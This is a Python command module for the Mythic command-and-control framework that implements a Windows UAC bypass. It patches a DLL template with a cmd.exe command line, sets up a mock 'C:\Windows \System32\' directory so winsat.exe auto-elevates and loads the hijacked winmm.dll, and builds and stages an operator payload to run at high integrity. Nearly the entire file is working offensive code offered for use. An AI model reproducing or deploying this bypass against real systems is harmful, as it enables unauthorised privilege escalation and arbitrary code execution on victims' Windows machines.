from CommandBase import *
import json
from os import path
from uuid import uuid4
from MythicFileRPC import *
from MythicPayloadRPC import *


class BypassuacArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "payload": CommandParameter(name="Payload Template", type=ParameterType.Payload),
            "targetPath": CommandParameter(name="Upload Path", type=ParameterType.String, required=False,
                              description="Where to save the payload on the target machine. Default: %temp%\<uuid>.exe"),
            "targetArgs": CommandParameter(name="Arguments", type=ParameterType.String, required=False,
                              description="Command line arguments to include when launching the executable. Default: none")
        }

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Invalid number of arguments. Require JSON blob.")
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            raise Exception("Require JSON blob of arguments, but got standard command line.")

class BypassuacCommand(CommandBase):
    cmd = "bypassuac"
    needs_admin = False
    help_cmd = "bypassuac (modal popup)"
    description = """Bypasses a UAC prompt using "mock" trusted directories. Creates the directory "C:\Windows \System32\" (note the space after Windows) and copies winsat.exe to the folder. When winsat.exe starts from the mock System32 directory, it auto-elevates to high integrity and attempts to load the file winmm.dll. The command writes the a payload to disk (the "targetPath" parameter) and hijacks winmm.dll causing it to start the payload using "cmd.exe /c <targetPath> <targetArgs>"""
    version = 3
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@tifkin_"
    argument_class = BypassuacArguments
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        targetPath = task.args.get_arg("targetPath")
        dllShortName = "bypass_mockdirs_winmm.dll"
        bypassDllBytes = open(f"{path.join(self.agent_code_path, dllShortName)}", 'rb').read()
        payload = task.args.get_arg("payload")
        targetArgs = task.args.get_arg("targetArgs")
        if targetArgs is None or targetArgs == "":
            targetArgs = "blah"
        if targetPath is None or targetPath == "":
            targetPath = f"%temp%\\{str(uuid4())}.exe"
        executablePath = 'C:\\Windows\\System32\\cmd.exe'
        executablePathLen = 256
        executablePathReplacementBytes = executablePath.encode(
            'utf-8') + (b"\x00"*(executablePathLen-len(executablePath)))
        bypassDllBytes = bypassDllBytes.replace(
            b'A'*executablePathLen, executablePathReplacementBytes)

        # Patch in the command's args to the bypass DLL. This is stored as 256 B's in the compiled bypass DLL
        executableArgs = '/c "%s" %s' % (targetPath, targetArgs)
        executableArgsLen = 256
        executableArgsReplacementBytes = executableArgs.encode(
            'utf-8') + (b"\x00"*(executableArgsLen-len(executableArgs)))
        bypassDllBytes = bypassDllBytes.replace(
            b'B'*executableArgsLen, executableArgsReplacementBytes)
        
        gen_resp = await MythicPayloadRPC(task).build_payload_from_template(task.args.get_arg('payload'),
                                                                            description=task.operator + "'s callback from bypassuac task " + str(task.task_id))
        if gen_resp.status == MythicStatus.Success:
            # we know a payload is building, now we want it
            while True:
                resp = await MythicPayloadRPC(task).get_payload_by_uuid(gen_resp.uuid)
                if resp.status == MythicStatus.Success:
                    if resp.build_phase == 'success':
                        if len(resp.contents) > 1 and resp.contents[:2] != b"\x4d\x5a":
                            raise Exception("bypassuac requires a payload an executable, but got unknown format.")
                        # it's done, so we can register a file for it
                        task.args.add_arg("payload", resp.agent_file_id)
                        break
                    elif resp.build_phase == 'error':
                        raise Exception("Failed to build new payload: " + resp.error_message)
                    elif resp.build_phase == "building":
                        await asyncio.sleep(2)
                    else:
                        raise Exception(resp.build_phase)
                else:
                    raise Exception(resp.error_message)
        else:
            raise Exception("Failed to start build process")

        task.args.add_arg("targetPath", targetPath)

        task.args.remove_arg("targetArgs")
        resp = await MythicFileRPC(task).register_file(bypassDllBytes)
        if resp.status == MythicStatus.Success:
            task.args.add_arg("bypassDll", resp.agent_file_id)
        else:
            raise Exception(f"Failed to register bypass DLL: {resp.error_message}")
        return task

    async def process_response(self, response: AgentResponse):
        pass